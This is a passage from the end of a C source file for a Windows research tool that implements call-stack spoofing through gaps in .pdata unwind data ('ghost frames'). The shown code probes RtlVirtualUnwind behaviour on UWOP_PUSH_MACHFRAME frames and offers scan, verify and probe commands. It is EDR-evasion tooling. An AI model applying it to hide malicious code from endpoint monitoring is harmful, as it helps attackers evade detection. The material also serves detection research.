    printf("\n[*] functions carrying UWOP_PUSH_MACHFRAME, and the ControlPc that teleports\n");
    int found = 0;
    for (int i = 0; i < count && found < 8; i++) {
        if (!rf[i].Unwind) continue;
        UH *uh = (UH *)(img + rf[i].Unwind);
        uint8_t *codes = (uint8_t *)uh + 4;
        int j = 0;
        while (j < uh->Count) {
            uint8_t off = codes[j * 2], op = codes[j * 2 + 1] & 0x0F, oi = codes[j * 2 + 1] >> 4;
            if (op == UWOP_PUSH_MACHFRAME) {
                printf("\n  func %016llx-%016llx  prolog=%u  codes=%u  "
                       "mfoff=%u  opinfo=%u\n",
                       (unsigned long long)(img + rf[i].Begin),
                       (unsigned long long)(img + rf[i].End), uh->Prolog, uh->Count, off, oi);
                for (int d = 0; d <= 48 && d < (int)(rf[i].End - rf[i].Begin); d++) {
                    CONTEXT c;
                    memset(&c, 0, sizeof(c));
                    c.ContextFlags = CONTEXT_FULL;
                    c.Rip = img + rf[i].Begin + d;
                    c.Rsp = (uint64_t)&g_ls->mf;
                    uint64_t ib = 0;
                    RF *fr = pLookupFE(c.Rip, &ib, NULL);
                    void *hd = NULL; uint64_t ef = 0;
                    CONTEXT c2 = c;
                    pUnwind(UNW_FLAG_NHANDLER, ib, c2.Rip, fr, &c2, &hd, &ef, NULL);
                    if (c2.Rip == g_L1 || c2.Rsp == (uint64_t)&g_mf_walk[0])
                        printf("     controlpc=+0x%-2x -> Rip=%016llx Rsp=%016llx  <== teleport\n",
                               d, (unsigned long long)c2.Rip, (unsigned long long)c2.Rsp);
                }
                found++;
                break;
            }
            j += unwind_slots(op, oi);
        }
    }
    if (!found) printf("\n  none found\n");
}

/* ---------------------------------------------------------------------- main */

static bool resolve_unwind_apis(void)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pLookupFE = (fn_LookupFE)(void *)GetProcAddress(ntdll, "RtlLookupFunctionEntry");
    pUnwind   = (fn_Unwind)(void *)GetProcAddress(ntdll, "RtlVirtualUnwind");
    return pLookupFE && pUnwind;
}

int main(int argc, char **argv)
{
    printf("\n=====================================================================\n");
    printf(" LACUNA Chain - Ghost Frames (.pdata lacunae)\n");
    printf(" call-stack spoofing with zero .pdata modification\n");
    printf("=====================================================================\n");

    if (!resolve_unwind_apis()) {
        printf("[!] could not resolve RtlLookupFunctionEntry / RtlVirtualUnwind\n");
        return 1;
    }

    if (argc < 2) {
        printf("\nusage:\n");
        printf("  lacuna.exe scan      enumerate .pdata lacunae / ghost functions / gadgets\n");
        printf("  lacuna.exe verify    build the ghost chain and walk it like an EDR\n");
        printf("  lacuna.exe mfprobe   list UWOP_PUSH_MACHFRAME frames (BYOUD-MF diagnostics)\n");
        return 1;
    }

    if (!strcmp(argv[1], "scan")) { do_scan(); return 0; }
    if (!strcmp(argv[1], "verify")) { do_verify(); return 0; }
    if (!strcmp(argv[1], "mfprobe")) {
        if (!build_chain()) { printf("[!] chain build failed\n"); return 1; }
        do_mfprobe();
        return 0;
    }

    printf("[!] unknown command '%s'\n", argv[1]);
    return 1;
}
